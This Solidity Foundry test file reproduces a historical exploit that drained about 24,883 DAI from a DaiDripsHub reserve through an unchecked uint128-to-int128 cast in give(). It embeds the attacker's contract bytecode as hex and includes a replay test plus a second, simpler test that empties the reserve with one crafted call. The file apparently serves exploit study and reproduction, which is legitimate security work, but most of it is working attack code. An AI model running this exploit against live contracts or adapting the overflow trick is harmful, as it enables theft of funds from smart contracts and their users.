// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~24,882.99 DAI
// Attacker : 0x84da7a5e2315eb798f04b75554aeb15047269cce
// Attack Contract : 0x00c64b5a926ba1fcec30efad88c344c619f54f12 (CREATE in attack block, nonce 0)
// Vulnerable Contract : 0x73043143e0a6418cc45d82d4505b096b802fd365 (DaiDripsHub proxy)
// Implementation : 0x8d321e80487356c846f34456d31ce761776ef697 (DaiDripsHub)
// DaiReserve : 0xf9bbb2df44cfe46e501cf91c99b2f8fef9d9d44a
// Attack Tx : https://etherscan.io/tx/0xc38a6e2259a85ced94238a0b0a49697992f2a6b8140c28f3fd2343d3d8434130
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8d321e80487356c846f34456d31ce761776ef697#code
// DAI : 0x6B175474E89094C44Da98b954EedeAC495271d0F
//
// @Analysis
// Root cause:
//  DaiDripsHub._give() charges the giver via `_transfer(user, -int128(amt))` without
//  checking `amt <= type(int128).max`. Casting a large uint128 to int128 wraps to a
//  negative value; negating it makes the signed transfer *positive*, so ERC20DripsHub
//  withdraws from DaiReserve and pays the caller instead of debiting them.
// Attack path (atomic CREATE + call):
//  deploy attack contract (nonce 0) → attack(beneficiary) with amt = 2^128 - reserveBal
//  → hub.give(receiver, amt) → int128 wrap → reserve pays attacker → DAI swept to EOA.
//
// PoC strategy: replay historical CREATE initcode + attack(address) at block 25529926
// (one before the exploit). Historical CREATE address depends on attacker nonce=0.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IDaiDripsHub {
    function give(address receiver, uint128 amt) external;
    function paused() external view returns (bool);
}

interface IAttack {
    function attack(address beneficiary) external payable;
}

contract DripsDaiHub_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x84dA7a5e2315Eb798f04B75554AeB15047269CCE;
    // Historical CREATE address (attacker nonce 0 at fork block)
    address constant ATTACK_CONTRACT = 0x00c64B5a926ba1fceC30EfaD88C344c619F54F12;
    address constant HUB = 0x73043143e0A6418cc45d82D4505B096b802FD365;
    address constant RESERVE = 0xF9BBb2dF44cfe46e501cf91c99B2f8FeF9D9d44A;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    // Receiver used in historical give() (from Given event)
    address constant GIVE_RECEIVER = 0x962f827743078B18cf437f1DeEA721b42dD19F8c;

    // Historical CREATE initcode from tx 0x00615e8ee6f7b77e32fe62c3767d6dd08458b55fec32e78bd70d4b2be2a80a6a
bytes constant CREATE_INITCODE =
        hex"60a060405234801561001057600080fd5b503360805260805161076c61003660"
        hex"0039600081816099015261016d015261076c6000f3fe60806040526004361061"
        hex"00595760003560e01c806301681a62146100655780638da5cb5b146100875780"
        hex"639d2cc436146100d7578063a4c52b86146100ff578063d018db3e1461012757"
        hex"8063e0bab4c41461013a57600080fd5b3661006057005b600080fd5b34801561"
        hex"007157600080fd5b50610085610080366004610675565b610162565b005b3480"
        hex"1561009357600080fd5b506100bb7f0000000000000000000000000000000000"
        hex"00000000000000000000000000000081565b6040516001600160a01b03909116"
        hex"815260200160405180910390f35b3480156100e357600080fd5b506100bb73f9"
        hex"bbb2df44cfe46e501cf91c99b2f8fef9d9d44a81565b34801561010b57600080"
        hex"fd5b506100bb7373043143e0a6418cc45d82d4505b096b802fd36581565b6100"
        hex"85610135366004610675565b610310565b34801561014657600080fd5b506100"
        hex"bb736b175474e89094c44da98b954eedeac495271d0f81565b336001600160a0"
        hex"1b037f0000000000000000000000000000000000000000000000000000000000"
        hex"00000016146101cb5760405162461bcd60e51b81526020600482015260096024"
        hex"820152683737ba1037bbb732b960b91b60448201526064015b60405180910390"
        hex"fd5b6040516370a0823160e01b8152306004820152600090736b175474e89094"
        hex"c44da98b954eedeac495271d0f906370a0823190602401602060405180830381"
        hex"865afa15801561021d573d6000803e3d6000fd5b505050506040513d601f1960"
        hex"1f8201168201806040525081019061024191906106a5565b9050600081116102"
        hex"865760405162461bcd60e51b815260206004820152601060248201526f06e6f7"
        hex"468696e6720746f2073776565760841b60448201526064016101c2565b604051"
        hex"63a9059cbb60e01b81526001600160a01b038316600482015260248101829052"
        hex"736b175474e89094c44da98b954eedeac495271d0f9063a9059cbb9060440160"
        hex"20604051808303816000875af11580156102e7573d6000803e3d6000fd5b5050"
        hex"50506040513d601f19601f8201168201806040525081019061030b91906106be"
        hex"565b505050565b600073f9bbb2df44cfe46e501cf91c99b2f8fef9d9d44a6001"
        hex"600160a01b031663b69ef8a86040518163ffffffff1660e01b81526004016020"
        hex"60405180830381865afa158015610364573d6000803e3d6000fd5b5050505060"
        hex"40513d601f19601f8201168201806040525081019061038891906106a5565b90"
        hex"50600081116103d25760405162461bcd60e51b81526020600482015260156024"
        hex"820152745265736572766520616c726561647920656d70747960581b60448201"
        hex"526064016101c2565b60006103df6001836106f6565b6103f090600160016080"
        hex"1b0361070f565b60408051426020820152309181019190915290915060009060"
        hex"600160408051808303601f1901815290829052805160209091012063032ad2ab"
        hex"60e61b82526001600160a01b03811660048301526001600160801b0384166024"
        hex"83015291507373043143e0a6418cc45d82d4505b096b802fd3659063cab4aac0"
        hex"90604401600060405180830381600087803b15801561048757600080fd5b505a"
        hex"f115801561049b573d6000803e3d6000fd5b50506040516370a0823160e01b81"
        hex"5230600482015260009250736b175474e89094c44da98b954eedeac495271d0f"
        hex"91506370a0823190602401602060405180830381865afa1580156104f1573d60"
        hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081"
        hex"019061051591906106a5565b9050600081116105765760405162461bcd60e51b"
        hex"815260206004820152602660248201527f4e6f20444149207265636569766564"
        hex"202d206578706c6f697420646964206e6f6044820152657420776f726b60d01b"
        hex"60648201526084016101c2565b60405163a9059cbb60e01b81526001600160a0"
        hex"1b038616600482015260248101829052736b175474e89094c44da98b954eedea"
        hex"c495271d0f9063a9059cbb906044016020604051808303816000875af1158015"
        hex"6105d7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201"
        hex"80604052508101906105fb91906106be565b5034801561063257604051419082"
        hex"156108fc029083906000818181858888f19350505050158015610630573d6000"
        hex"803e3d6000fd5b505b604080518381526020810183905233917fa923c01ed696"
        hex"2cfbd7f4a70439dc11338b754f880620dd0fb660b574494a4834910160405180"
        hex"910390a2505050505050565b60006020828403121561068757600080fd5b8135"
        hex"6001600160a01b038116811461069e57600080fd5b9392505050565b60006020"
        hex"82840312156106b757600080fd5b5051919050565b6000602082840312156106"
        hex"d057600080fd5b8151801515811461069e57600080fd5b634e487b7160e01b60"
        hex"0052601160045260246000fd5b81810381811115610709576107096106e0565b"
        hex"92915050565b6001600160801b0382811682821603908082111561072f576107"
        hex"2f6106e0565b509291505056fea2646970667358221220f0a3ac9acc822391d9"
        hex"28a40d98d0323dad6e7acc9f5f256da3b54633d4ad913464736f6c6343000814"
        hex"0033";

    // Historical attack call: attack(attacker) + 0.02 ETH tip/value
    bytes constant ATTACK_CALLDATA =
        hex"d018db3e"
        hex"00000000000000000000000084da7a5e2315eb798f04b75554aeb15047269cce";

    uint256 constant ATTACK_BLOCK = 25_529_927;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;
    // Exact historical drain: full DaiReserve DAI balance
    uint256 constant EXPECTED_PROFIT = 24_882_995_421_947_667_857_715;

    function setUp() public {
        // Online warm: use mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = DAI;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        require(!IDaiDripsHub(HUB).paused(), "hub paused");
        uint256 reserveBefore = IERC20(DAI).balanceOf(RESERVE);
        uint256 attackerBefore = IERC20(DAI).balanceOf(ATTACKER);
        require(reserveBefore == EXPECTED_PROFIT, "unexpected reserve balance");
        require(attackerBefore == 0, "attacker already funded");

        // Replay historical CREATE (attacker nonce 0 → ATTACK_CONTRACT).
        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");

        // Replay historical attack call with 0.02 ETH value.
        (bool ok, bytes memory ret) = ATTACK_CONTRACT.call{value: 0.02 ether}(ATTACK_CALLDATA);
        require(ok, string(ret));
        vm.stopPrank();

        uint256 attackerAfter = IERC20(DAI).balanceOf(ATTACKER);
        uint256 reserveAfter = IERC20(DAI).balanceOf(RESERVE);
        uint256 profit = attackerAfter - attackerBefore;

        assertEq(profit, EXPECTED_PROFIT, "attacker DAI profit mismatch");
        assertEq(reserveAfter, 0, "reserve not emptied");

        // Document the cast math used on-chain.
        uint128 amt = uint128(type(uint128).max - uint128(EXPECTED_PROFIT) + 1);
        // amt == 2^128 - EXPECTED_PROFIT; int128(amt) == -int128(EXPECTED_PROFIT)
        int128 wrapped = int128(amt);
        require(wrapped == -int128(int256(EXPECTED_PROFIT)), "wrap math mismatch");
        require(-wrapped == int128(int256(EXPECTED_PROFIT)), "negation math mismatch");

        emit log_named_decimal_uint("Attacker DAI profit", profit, 18);
        emit log_named_decimal_uint("Reserve DAI after", reserveAfter, 18);
        emit log_named_uint("give amt (uint128)", uint256(amt));
        emit log_named_int("int128(amt) wrap", int256(wrapped));
        emit log_named_int("-int128(amt) transfer", int256(-wrapped));
    }

    /// @dev Clean reproduction without historical bytecode: direct hub.give with
    /// overflowing amt. Same economic result as the CREATE-replay path.
    function testCleanGiveCast() public {
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        uint256 reserveBefore = IERC20(DAI).balanceOf(RESERVE);
        // Craft amt so -int128(amt) == +reserveBefore (signed withdraw path).
        uint128 amt = uint128(type(uint128).max - uint128(reserveBefore) + 1);

        // Call give as this contract; profit lands here (user = msg.sender).
        IDaiDripsHub(HUB).give(GIVE_RECEIVER, amt);

        uint256 profit = IERC20(DAI).balanceOf(address(this));
        assertEq(profit, reserveBefore, "clean path profit mismatch");
        assertEq(IERC20(DAI).balanceOf(RESERVE), 0, "reserve not emptied");
        emit log_named_decimal_uint("Clean-path DAI profit", profit, 18);
    }
}
